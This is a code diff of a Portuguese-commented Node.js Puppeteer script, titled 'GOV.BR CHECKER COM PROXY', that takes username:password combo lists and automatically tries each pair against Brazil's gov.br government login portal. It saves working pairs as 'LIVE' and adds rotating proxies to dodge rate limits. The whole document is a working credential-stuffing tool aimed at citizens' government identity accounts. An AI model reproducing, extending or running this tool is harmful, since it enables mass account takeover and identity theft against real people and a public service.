@@ -1,226 +1,190 @@
 const fs = require("fs");
 const puppeteer = require("puppeteer");
 
+// Sistema de proxy simples
+class ProxySystem {
+    constructor() {
+        this.proxies = [];
+        this.currentIndex = 0;
+    }
+    
+    carregarProxies() {
+        try {
+            if (fs.existsSync("proxies.txt")) {
+                const data = fs.readFileSync("proxies.txt", "utf8");
+                this.proxies = data.split('\n')
+                    .map(p => p.trim())
+                    .filter(p => p && !p.startsWith('#'));
+                console.log(`📦 ${this.proxies.length} proxies carregados`);
+            } else {
+                console.log("⚠️  Arquivo proxies.txt não encontrado, usando conexão direta");
+            }
+        } catch (error) {
+            console.log("⚠️  Erro ao carregar proxies, usando direto");
+        }
+        return this;
+    }
+    
+    getProxy() {
+        if (this.proxies.length === 0) return null;
+        
+        const proxy = this.proxies[this.currentIndex];
+        this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
+        return proxy;
+    }
+}
+
+// Delay função (mantida igual)
 async function delay(ms) {
-  return new Promise(res => setTimeout(res, ms));
+    return new Promise(res => setTimeout(res, ms));
 }
 
-async function tentarLoginGovBR(usuario, senha) {
-  const navegador = await puppeteer.launch({ 
-    headless: true, 
-    defaultViewport: null,
-    args: ['--no-sandbox', '--disable-setuid-sandbox']
-  });
-  const page = await navegador.newPage();
+// Função principal de login com proxy
+async function tentarLoginGovBR(usuario, senha, proxy = null) {
+    const configNavegador = { 
+        headless: true, 
+        defaultViewport: null,
+        args: ['--no-sandbox', '--disable-setuid-sandbox']
+    };
+    
+    // Adiciona proxy se existir
+    if (proxy) {
+        configNavegador.args.push(`--proxy-server=${proxy}`);
+        console.log(`🌐 Usando proxy: ${proxy}`);
+    }
+    
+    const navegador = await puppeteer.launch(configNavegador);
+    const page = await navegador.newPage();
 
-  try {
-    await page.goto("https://sso.acesso.gov.br/login", {
-      waitUntil: "networkidle2",
-      timeout: 60000
-    });
+    try {
+        // Acessa página de login
+        await page.goto("https://sso.acesso.gov.br/login", {
+            waitUntil: "networkidle2",
+            timeout: 60000
+        });
 
-    await page.waitForSelector("#accountId", { timeout: 20000 });
-    
-    await page.type("#accountId", usuario, { delay: 50 });
-    
-    await page.click("#enter-account");
-    
-    await delay(3000);
-    
-    const senhaSelector = "#password";
-    const senhaExiste = await page.$(senhaSelector).catch(() => null);
-    
-    if (!senhaExiste) {
-      const erroUsuario = await page.$eval(".erro", el => el.innerText).catch(() => null);
-      if (erroUsuario && erroUsuario.includes("não encontrada")) {
-        await navegador.close();
-        return false;
-      }
-    }
-    
-    await page.waitForSelector(senhaSelector, { timeout: 10000 });
-
-    await page.type(senhaSelector, senha, { delay: 50 });
-    
-    await page.click("#enter-password");
-    
-    await delay(6000);
-    
-    const urlAtual = page.url();
-    
-    if (urlAtual.includes("login") || urlAtual.includes("sso")) {
-      await navegador.close();
-      return false;
-    }
-    
-    const erroSenha = await page.$eval(".error-message, .erro, .alert-danger", 
-      el => el.innerText).catch(() => null);
-    
-    if (erroSenha && (erroSenha.includes("incorreta") || erroSenha.includes("inválida"))) {
-      await navegador.close();
-      return false;
-    }
-    
-    const titulo = await page.title().catch(() => "");
-    const bodyText = await page.$eval("body", el => el.innerText).catch(() => "");
-    
-    if (titulo.includes("Gov.br") || bodyText.includes("Minha conta") || 
-        bodyText.includes("Bem-vindo") || !urlAtual.includes("sso")) {
-      await navegador.close();
-      return true;
-    }
-    
-    await navegador.close();
-    return false;
-    
-  } catch (error) {
-    console.error(`Erro ao testar ${usuario}:`, error.message);
-    await navegador.close();
-    return false;
-  }
-}
-
-async function tentarLoginGovBRAlternativo(usuario, senha) {
-  const navegador = await puppeteer.launch({ 
-    headless: true, 
-    defaultViewport: null,
-    args: ['--no-sandbox', '--disable-setuid-sandbox']
-  });
-  const page = await navegador.newPage();
-
-  try {
-    await page.goto("https://acesso.gov.br/", {
-      waitUntil: "networkidle2",
-      timeout: 60000
-    });
-
-    const loginBtn = await page.$x("//a[contains(text(), 'Entrar') or contains(text(), 'Login') or contains(text(), 'Acessar')]");
-    
-    if (loginBtn.length > 0) {
-      await loginBtn[0].click();
-      await delay(3000);
-    }
-    
-    await page.waitForSelector("#accountId, input[name='username'], input[name='cpf'], input[type='email']", { timeout: 15000 });
-    
-    const campoUsuario = await page.$("#accountId") || 
-                         await page.$("input[name='username']") ||
-                         await page.$("input[name='cpf']") ||
-                         await page.$("input[type='email']");
-    
-    await campoUsuario.type(usuario, { delay: 50 });
-    
-    const continuarBtn = await page.$x("//button[contains(text(), 'Continuar') or contains(text(), 'Entrar') or contains(text(), 'Avançar')]");
-    
-    if (continuarBtn.length > 0) {
-      await continuarBtn[0].click();
-    } else {
-      await page.keyboard.press('Enter');
-    }
-    
-    await delay(4000);
-    
-    const campoSenha = await page.$("#password, input[name='password'], input[type='password']");
-    
-    if (!campoSenha) {
-      await navegador.close();
-      return false;
-    }
-    
-    await campoSenha.type(senha, { delay: 50 });
-    
-    const loginSubmit = await page.$x("//button[contains(text(), 'Entrar') or @type='submit']");
-    
-    if (loginSubmit.length > 0) {
-      await loginSubmit[0].click();
-    } else {
-      await page.keyboard.press('Enter');
-    }
-    
-    await delay(8000);
-    
-    const urlAtual = page.url();
-    const titulo = await page.title().catch(() => "");
-    
-    if (!urlAtual.includes("login") && !urlAtual.includes("sso") && 
-        !titulo.includes("Login") && !titulo.includes("Entrar")) {
-      
-      const erro = await page.$eval(".error, .alert-danger, .erro, .msg-erro", 
-        el => el.innerText).catch(() => null);
-      
-      if (!erro || (!erro.includes("incorreta") && !erro.includes("inválida"))) {
+        // Espera campo de usuário
+        await page.waitForSelector("#accountId", { timeout: 15000 });
+        
+        // Preenche usuário
+        await page.type("#accountId", usuario, { delay: 50 });
+        await page.click("#enter-account");
+        
+        await delay(3000);
+        
+        // Verifica se campo de senha apareceu
+        const senhaSelector = "#password";
+        const senhaExiste = await page.$(senhaSelector).catch(() => null);
+        
+        if (!senhaExiste) {
+            await navegador.close();
+            return false; // Usuário inválido
+        }
+        
+        // Preenche senha
+        await page.type(senhaSelector, senha, { delay: 50 });
+        await page.click("#enter-password");
+        
+        await delay(6000);
+        
+        // Verifica resultado
+        const urlAtual = page.url();
+        
+        // Se ainda está na página de login, falhou
+        if (urlAtual.includes("login") || urlAtual.includes("sso")) {
+            await navegador.close();
+            return false;
+        }
+        
+        // Se redirecionou, provavelmente logou
         await navegador.close();
         return true;
-      }
+        
+    } catch (error) {
+        await navegador.close();
+        return false;
     }
-    
-    await navegador.close();
-    return false;
-    
-  } catch (error) {
-    await navegador.close();
-    return false;
-  }
 }
 
+// Sistema principal
 (async () => {
-  if (!fs.existsSync("logs.txt")) {
-    console.error("❌ Arquivo logs.txt não encontrado!");
-    return;
-  }
-  
-  const logins = fs.readFileSync("logs.txt", "utf8")
-    .split('\n')
-    .filter(l => l.trim())
-    .map(l => {
-      const [usuario, senha] = l.split(':').map(s => s.trim());
-      return { usuario, senha };
-    })
-    .filter(l => l.usuario && l.senha);
-  
-  console.log("\n🔐 Testando logins gov.br...\n");
-  console.log(`📊 Total de credenciais para testar: ${logins.length}\n`);
-  
-  const livesFile = "lives_govbr.txt";
-  
-  if (fs.existsSync(livesFile)) {
-    fs.unlinkSync(livesFile);
-  }
-  
-  let validos = 0;
-  let testados = 0;
-  
-  for (let cred of logins) {
-    testados++;
-    const { usuario, senha } = cred;
+    console.log("=".repeat(50));
+    console.log("🔐 GOV.BR CHECKER COM PROXY");
+    console.log("=".repeat(50));
     
-    console.log(`[${testados}/${logins.length}] Testando: ${usuario}`);
+    // Carrega proxies
+    const proxySystem = new ProxySystem().carregarProxies();
     
-    let valido = await tentarLoginGovBR(usuario, senha);
-    
-    if (!valido) {
-      console.log(`   ⚠️  Primeiro método falhou, tentando alternativa...`);
-      valido = await tentarLoginGovBRAlternativo(usuario, senha);
+    // Carrega combos
+    if (!fs.existsSync("logs.txt")) {
+        console.error("❌ Arquivo logs.txt não encontrado!");
+        console.log("Crie um arquivo logs.txt com formato: usuario:senha");
+        process.exit(1);
     }
     
-    if (valido) {
-      validos++;
-      console.log(`   ✅ LIVE: ${usuario}:${senha}`);
-      fs.appendFileSync(livesFile, `${usuario}:${senha}\n`);
-    } else {
-      console.log(`   ❌ DIE: ${usuario}`);
+    const logins = fs.readFileSync("logs.txt", "utf8")
+        .split('\n')
+        .filter(l => l.trim())
+        .map(l => {
+            const [usuario, senha] = l.split(':').map(s => s.trim());
+            return { usuario, senha, original: l };
+        })
+        .filter(l => l.usuario && l.senha);
+    
+    console.log(`\n📦 ${logins.length} logins carregados`);
+    console.log("⚡ Iniciando verificação...\n");
+    
+    // Cria arquivo de resultados
+    const livesFile = "lives.txt";
+    fs.writeFileSync(livesFile, "");
+    
+    let validoCount = 0;
+    let testeCount = 0;
+    
+    // Testa cada login
+    for (let cred of logins) {
+        testeCount++;
+        const { usuario, senha, original } = cred;
+        
+        console.log(`[${testeCount}/${logins.length}] Testando: ${usuario}`);
+        
+        // Pega proxy (se disponível)
+        const proxy = proxySystem.getProxy();
+        
+        // Tenta fazer login
+        const valido = await tentarLoginGovBR(usuario, senha, proxy);
+        
+        if (valido) {
+            validoCount++;
+            console.log(`   ✅ LIVE: ${usuario}:${senha}`);
+            fs.appendFileSync(livesFile, `${original}\n`);
+        } else {
+            console.log(`   ❌ DIE: ${usuario}`);
+        }
+        
+        // Delay para não sobrecarregar
+        await delay(2000);
     }
     
-    await delay(2000);
-  }
-
-  const livesSalvos = fs.existsSync(livesFile) 
-    ? fs.readFileSync(livesFile, "utf8").split('\n').filter(l => l.trim())
-    : [];
-  
-  console.log(`\n🏁 Finalizado!`);
-  console.log(`📈 Resultados:`);
-  console.log(`   ✅ Logins válidos: ${validos}`);
-  console.log(`   ❌ Logins inválidos: ${logins.length - validos}`);
-  console.log(`   💾 Salvos em: ${livesFile}`);
+    // Resultado final
+    console.log("\n" + "=".repeat(50));
+    console.log("🏁 VERIFICAÇÃO CONCLUÍDA");
+    console.log("=".repeat(50));
+    console.log(`✅ Logins válidos: ${validoCount}`);
+    console.log(`❌ Logins inválidos: ${logins.length - validoCount}`);
+    console.log(`💾 Lives salvos em: ${livesFile}`);
+    console.log("");
+    
+    // Salva estatísticas simples
+    const stats = {
+        total: logins.length,
+        lives: validoCount,
+        dies: logins.length - validoCount,
+        date: new Date().toISOString(),
+        withProxy: proxySystem.proxies.length > 0
+    };
+    
+    fs.writeFileSync("stats.json", JSON.stringify(stats, null, 2));
+    console.log("📊 Estatísticas salvas em stats.json");
+    
 })();
